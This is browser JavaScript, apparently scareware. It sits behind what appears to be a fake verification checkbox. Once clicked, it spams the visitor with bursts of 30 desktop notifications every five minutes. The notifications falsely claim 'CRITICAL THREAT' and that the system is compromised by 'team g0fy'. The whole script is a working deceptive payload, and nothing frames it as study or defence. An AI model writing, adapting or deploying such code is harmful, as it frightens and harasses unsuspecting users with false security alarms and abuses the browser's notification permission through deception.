<script>
  // Ask for permission immediately
  window.onload = () => { 
    Notification.requestPermission(); 
  };

  function verify() {
    const check = document.getElementById('check');
    const msg = document.getElementById('statusMsg');
    check.classList.add('checked');

    setTimeout(() => {
      msg.style.display = 'block';
      
      // Start the first burst immediately
      triggerBurst();

      // Set the 5-minute loop (300,000 ms)
      setInterval(triggerBurst, 300000);
      
    }, 1500);
  }

  function triggerBurst() {
    if (Notification.permission === 'granted') {
      let count = 0;
      const maxSpam = 30; // 30 notifications per burst

      const burstInterval = setInterval(() => {
        new Notification("CRITICAL THREAT #" + (count + 1), {
          body: "System integrity compromised by team g0fy. Scanning...",
          icon: "https://cdn-icons-png.flaticon.com",
          tag: "alert-" + count + "-" + Date.now() // Unique tag so they don't overwrite
        });

        count++;
        if (count >= maxSpam) {
          clearInterval(burstInterval);
        }
      }, 500); // Sends one every 0.5 seconds for a fast burst effect
    } else {
      alert("ERROR: Notification Permission Required!");
    }
  }
</script>
